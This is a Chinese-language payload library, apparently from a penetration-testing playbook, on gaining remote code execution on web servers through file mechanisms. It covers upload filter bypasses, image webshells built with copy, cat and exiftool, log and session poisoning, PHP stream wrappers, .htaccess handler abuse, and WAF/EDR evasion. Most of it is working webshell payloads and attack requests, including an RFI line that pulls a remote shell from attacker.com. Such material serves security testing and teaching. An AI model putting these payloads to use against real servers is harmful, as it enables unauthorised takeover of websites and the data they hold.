<!-- Language: mixed | Chinese ratio: 16.68% -->
# RCE — 文件链 / 上传 / 包含 payload 库

> 父文档:[00-index.md](00-index.md)
> 通过文件系统获取代码执行:文件上传 + 解析配合 / 文件包含 / 日志投毒 / 图片马 / .htaccess。
> 上传点本身的多维度绕过见 `references/playbooks/file-upload/00-index.md`。

---

### 文件上传漏洞  `rce-file-upload`
利用文件上传漏洞获取RCE
子类：**文件上传** · tags: `rce` `upload` `webshell` `file`

**前置条件：** 存在文件上传功能；可上传可执行文件

**攻击链：**

**1. 1. 基础上传**
_直接上传可执行文件_
```text
上传PHP文件: shell.php
上传JSP文件: shell.jsp
上传ASPX文件: shell.aspx
上传CGI文件: shell.cgi
```text

**2. 2. 前端绕过**
_绕过前端验证_
```text
# 修改Content-Type
Content-Type: image/jpeg

# 修改文件扩展名
test.php -> test.jpg.php
test.php -> test.php.jpg

# 使用空字节
test.php%00.jpg
```text

**3. 3. 后端绕过**
_绕过后端黑名单_
```text
# 黑名单绕过
.php -> .phtml, .php3, .php5, .pht
.asp -> .asa, .cer, .cdx
.jsp -> .jspx, .jspf

# 大小写绕过
.Php, .pHp, .PHP

# 双写绕过
.pphphp
```text

**4. 4. 图片马**
_制作图片马_
```text
# 制作图片马
copy test.jpg/b + shell.php/a shell.jpg

# 利用文件包含执行
include($_GET['file']);
?file=upload/shell.jpg
```text

**5. 5. .htaccess上传**  _[linux]_
_利用.htaccess_
```text
# 上传.htaccess文件
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 之后上传的jpg文件会被当作PHP执行
```text

**WAF/EDR 绕过变体：**

**1. Content-Type绕过**
_Content-Type绕过_
```text
修改请求中的Content-Type为允许的类型
image/jpeg, image/png, image/gif
```text

**2. 文件头绕过**
_文件头绕过_
```text
在恶意文件前添加图片文件头
GIF89a<?php eval($_POST[cmd]);?>
```text

---

### 文件包含RCE  `rce-include`
利用文件包含漏洞实现RCE
子类：**文件包含** · tags: `rce` `include` `lfi` `rfi`

**前置条件：** 存在文件包含漏洞；可包含恶意文件

**攻击链：**

**1. 1. 日志投毒**  _[linux]_
_日志投毒RCE_
```text
# 注入代码到日志
User-Agent: <?php system($_GET['cmd']);?>

# 包含日志文件
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=whoami
```text

**2. 2. Session文件包含**  _[linux]_
_Session文件包含_
```text
# 注入代码到Session
?file=/var/lib/php/sessions/sess_[PHPSESSID]

# Session内容
<?php system($_GET['cmd']);?>
```text

**3. 3. /proc/self/environ**  _[linux]_
_包含环境变量_
```text
# 注入代码到环境变量
User-Agent: <?php system($_GET['cmd']);?>

# 包含环境变量文件
?file=/proc/self/environ&cmd=whoami
```text

**4. 4. PHP伪协议**
_PHP伪协议利用_
```text
# php://input
?file=php://input
POST: <?php system('whoami');?>

# data://协议
?file=data://text/plain,<?php system('whoami');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```text

**5. 5. 远程文件包含**
```text
# RFI直接包含远程Shell
?file=http://attacker.com/shell.txt

# shell.txt内容
<?php system($_GET['cmd']);?>
```text

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_URL编码绕过_
```text
?file=%2fvar%2flog%2fapache2%2faccess.log
URL编码路径
```text

---

### 日志投毒RCE  `rce-log-poison`
利用日志投毒实现RCE
子类：**日志投毒** · tags: `rce` `log` `poison` `lfi`

**前置条件：** 存在文件包含漏洞；可读取日志文件

**攻击链：**

**1. 1. Apache日志投毒**  _[linux]_
_Apache日志投毒_
```text
# 注入代码到访问日志
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志执行
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/httpd/access_log&cmd=whoami
```text

**2. 2. Nginx日志投毒**
```text
# 注入代码
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志
?file=/var/log/nginx/access.log&cmd=whoami
```text

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```text
使用URL编码或Base64编码绕过关键字过滤
```text

---

### 图片马RCE  `rce-image`
利用图片马实现RCE
子类：**图片马** · tags: `rce` `image` `webshell` `upload`

**前置条件：** 存在文件上传；存在文件包含

**攻击链：**

**1. 1. 制作图片马**
_制作图片马_
```text
# Windows
copy test.jpg/b + shell.php/a shell.jpg

# Linux
cat test.jpg shell.php > shell.jpg

# 在图片末尾添加PHP代码
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg
```text

**2. 2. 图片马内容**
_图片马格式_
```text
GIF89a
<?php @eval($_POST[cmd]);?>

# 或使用Exif注释
exiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg
```text

**3. 3. 利用文件包含执行**
_文件包含执行_
```text
# 配合文件包含漏洞
?file=upload/shell.jpg
POST: cmd=system('whoami');

# 配合phar://
?file=phar://upload/shell.jpg
```text

**4. 4. 配合.htaccess**  _[linux]_
_配合.htaccess执行_
```text
# 上传.htaccess
AddType application/x-httpd-php .jpg

# 直接访问图片执行
http://target/upload/shell.jpg
```text

**WAF/EDR 绕过变体：**

**1. 文件头伪装**
_文件头伪装_
```text
使用真实图片文件头
确保图片可正常预览
```text

---

### .htaccess利用  `rce-htaccess`
利用.htaccess文件实现RCE
子类：**.htaccess** · tags: `rce` `htaccess` `apache` `upload`

**前置条件：** Apache服务器；可上传.htaccess

**攻击链：**

**1. 1. 解析其他扩展名**  _[linux]_
_修改文件类型解析_
```text
# 让.jpg文件作为PHP执行
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 让.txt文件作为PHP执行
AddType application/x-httpd-php .txt
```text

**2. 2. 自动包含**  _[linux]_
_自动包含文件_
```text
# 自动在每个文件前包含
php_value auto_prepend_file /var/www/html/shell.php

# 自动在每个文件后包含
php_value auto_append_file /var/www/html/shell.php
```text

**3. 3. 伪静态RCE**  _[linux]_
_伪静态配置_
```text
# 利用mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# 更危险的配置
SetHandler application/x-httpd-php
```text

**4. 4. 错误页面包含**  _[linux]_
_错误页面利用_
```text
# 自定义错误页面
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php
```text

**5. 5. 文件包含绕过**  _[linux]_
_PHP配置修改_
```text
# 设置include路径
php_value include_path "/var/www/html/uploads"

# 禁用安全限制
php_flag safe_mode off
php_flag display_errors on
```text

**WAF/EDR 绕过变体：**

**1. 换行绕过**  _[linux]_
_换行绕过_
```text
使用换行符分隔配置
绕过单行检测
```text

---

---

← 回 [00-index.md](00-index.md) · 相关:`references/playbooks/file-upload/00-index.md`(上传绕过)
